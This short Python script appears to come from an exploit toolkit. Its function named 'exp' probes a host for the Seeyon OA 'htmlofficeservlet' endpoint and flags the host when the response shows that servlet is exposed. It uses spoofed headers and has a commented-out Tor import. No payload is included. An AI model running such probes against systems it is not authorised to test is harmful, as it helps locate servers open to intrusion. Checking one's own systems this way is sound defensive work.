#from lib.tor import *
import requests
import re

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
    "Content-Type": "text/xml"
}

def exp(target):
    host,port = target.split(':')
    url = 'http://' + target + '/seeyon/htmlofficeservlet'

    resp = requests.get( url ,timeout=3)

    if "DBSTEP"  in resp.text and "htmoffice" in resp.text:
        return url + "====>" + resp.text
        

    
